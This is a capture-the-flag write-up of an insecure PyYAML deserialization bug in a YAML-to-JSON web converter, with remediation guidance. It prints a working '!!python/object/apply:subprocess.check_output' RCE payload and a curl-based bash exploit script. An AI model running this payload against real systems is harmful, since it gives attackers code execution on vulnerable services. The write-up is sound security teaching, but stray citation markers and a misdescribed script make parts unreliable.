# Challenge - YAML Ain't Safe

> **Category:** Web  
> **Difficulty:** Easy  

## Description

The challenge provides a web application that converts YAML input into JSON.

The application appears to offer a simple data conversion service, but the challenge name **"YAML Ain't Safe"** hints at an insecure YAML deserialization issue.

The application processes user-controlled YAML input using an unsafe YAML loader, allowing attackers to execute Python functions during deserialization.

By abusing this behavior, it is possible to achieve **Remote Code Execution (RCE)** and retrieve the contents of:

```
/flag.txt
```

---

# Challenge Overview

The application exposes a YAML-to-JSON conversion endpoint.

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/` | Web interface for YAML conversion |
| GET | `/health` | Application health check |
| POST | `/convert` | Receives YAML input and returns parsed output |

The vulnerable functionality is located at:

```
POST /convert
```

The endpoint receives JSON data:

```json
{
    "yaml_input": "example: value"
}
```

and processes the YAML content server-side.

---

# Initial Reconnaissance

The challenge provided a file:

```
public.zip
```

protected with the password:

```
infected
```

Extraction:

```bash
unzip -P infected public.zip
```

The archive contained the application source code.

During source review, the vulnerable code was identified:

```python
parsed = yaml.load(
    yaml_input,
    Loader=yaml.Loader
)
```

This immediately indicated a possible unsafe deserialization vulnerability.

---

# Vulnerability Analysis

## Unsafe YAML Deserialization

PyYAML provides different loaders:

| Loader | Secure | Description |
|--------|--------|-------------|
| `yaml.SafeLoader` | ✅ | Only processes standard YAML types |
| `yaml.Loader` | ❌ | Allows Python object construction |

The vulnerable implementation:

```python
yaml.load(
    user_input,
    Loader=yaml.Loader
)
```

Unlike:

```python
yaml.safe_load()
```

the unsafe loader supports special Python-specific YAML tags.

Examples:

```yaml
!!python/object
!!python/name
!!python/object/apply
```

These tags allow an attacker to instantiate Python objects or call Python functions during YAML parsing.

---

# Vulnerable Code

The vulnerable endpoint behaves similarly to:

```python
@app.route('/convert', methods=['POST'])
def convert():

    data = request.get_json()

    yaml_input = data.get(
        "yaml_input",
        ""
    )

    parsed = yaml.load(
        yaml_input,
        Loader=yaml.Loader
    )

    return jsonify({
        "result": json.dumps(
            parsed,
            indent=2,
            default=str
        )
    })
```

Security issues:

- User input reaches `yaml.load()` directly.
- No input validation is performed.
- Unsafe loader allows Python object creation.
- The application returns the processed result to the attacker.

---

# Exploitation Strategy

The objective was to execute a system command and read:

```
/flag.txt
```

The YAML constructor:

```yaml
!!python/object/apply
```

allows calling Python functions during deserialization.

The exploit uses:

```python
subprocess.check_output()
```

because it executes a command and returns the command output.

---

# Exploit Payload

The payload used:

```yaml
!!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
```

PyYAML interprets this as:

```python
subprocess.check_output(
    [
        "cat",
        "/flag.txt"
    ]
)
```

The executed command:

```bash
cat /flag.txt
```

returns the flag contents.

---

# Execution Flow

```
Malicious YAML
        |
        v
yaml.load()
        |
        v
Resolve python/object/apply
        |
        v
Execute subprocess.check_output()
        |
        v
cat /flag.txt
        |
        v
Return flag contents
```

---

# Why The Payload Works

The exploit abuses three behaviors.

## 1. Unsafe YAML Loader

The application uses:

```python
yaml.Loader
```

which allows Python-specific constructors.

---

## 2. Function Invocation

The YAML tag:

```yaml
!!python/object/apply
```

allows calling a Python callable.

In this case:

```python
subprocess.check_output()
```

---

## 3. Response Serialization

The application returns:

```python
json.dumps(
    parsed,
    default=str
)
```

The command output is returned as bytes:

```python
b'flag{...}'
```

Since bytes are not directly JSON serializable:

```python
default=str
```

converts the result into a string representation containing the flag.

---

# Exploit Script

The following script automates the exploitation process:

```bash
#!/usr/bin/env bash

set -euo pipefail

echo "[+] YAML-to-JSON Converter Exploit"

read -rp "Ingresa el host completo: " TARGET


if [ -z "$TARGET" ]; then
    echo "[-] No pusiste ningun host."
    exit 1
fi


TARGET="${TARGET%/}"

ENDPOINT="$TARGET/convert"


echo "[+] Target: $TARGET"
echo "[+] Endpoint: $ENDPOINT"


PAYLOAD='!!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]'


JSON_DATA="$(PAYLOAD="$PAYLOAD" python3 - <<'PY'
import json
import os

print(json.dumps({
    "yaml_input": os.environ["PAYLOAD"]
}))
PY
)"


RESPONSE="$(curl -skS \
-X POST "$ENDPOINT" \
-H "Content-Type: application/json" \
--data "$JSON_DATA")"


echo "$RESPONSE"
```

---

# Flag Extraction

After sending the malicious YAML payload, the application returns the result generated by:

```python
json.dumps(parsed, default=str)

The response contains the output of:

cat /flag.txt

Example:

{
    "result": "\"b'flag{a8381bb420d4f98d}\\n'\""
}

The script automatically searches the response and extracts the flag.
```

---

# Remediation

The root cause of this vulnerability is **unsafe deserialization of user-controlled YAML data**.

The vulnerable implementation:

```python
parsed = yaml.load(
    yaml_input,
    Loader=yaml.Loader
)
```

allows attackers to create arbitrary Python objects and execute functions during YAML parsing.

---

# Secure Implementation

The application should replace unsafe YAML loading with a secure parser.[web:1][web:5]

Recommended implementation:

```python
parsed = yaml.safe_load(
    yaml_input
)
```

or:

```python
parsed = yaml.load(
    yaml_input,
    Loader=yaml.SafeLoader
)
```

`SafeLoader` prevents the execution of dangerous Python-specific YAML constructors such as:

```yaml
!!python/object/apply
```

making it impossible for attackers to invoke arbitrary Python functions through YAML input.[web:1][web:6]

---

# Additional Security Recommendations

## Avoid Unsafe Loaders

Never use:

```python
yaml.Loader
```

or:

```python
yaml.UnsafeLoader
```

when processing untrusted user input.[web:5][web:6]

Unsafe loaders allow object construction and can lead to Remote Code Execution (RCE).[web:6]

## Validate Input Structure

Even when using safe parsing methods, applications should validate that the received YAML matches the expected structure.[web:6]

Example:

```python
if not isinstance(data, dict):
    reject_request()
```

Input validation provides an additional **security** layer.[web:6]

---

# Skills Demonstrated

- Web application security testing
- YAML deserialization analysis
- Python security review
- Remote Code Execution (RCE)
- Unsafe library usage identification
- Payload development
- HTTP exploitation
- Bash automation
- Secure coding remediation

---

# Lessons Learned

This challenge demonstrates that serialization formats must be handled carefully when processing attacker-controlled data.[web:6]

YAML itself is not the vulnerability. The security issue appears when developers use unsafe deserialization methods such as:

```python
yaml.load(
    data,
    Loader=yaml.Loader
)
```

with untrusted input.[web:5][web:6]

A single insecure configuration transformed a simple YAML-to-JSON converter into a Remote Code Execution primitive.[web:6]

The main security lesson is that choosing secure APIs is critical. Replacing:

```python
yaml.Loader
```

with:

```python
yaml.SafeLoader
```

or:

```python
yaml.safe_load()
```

prevents attackers from creating arbitrary Python objects and executing functions during the parsing process.

---
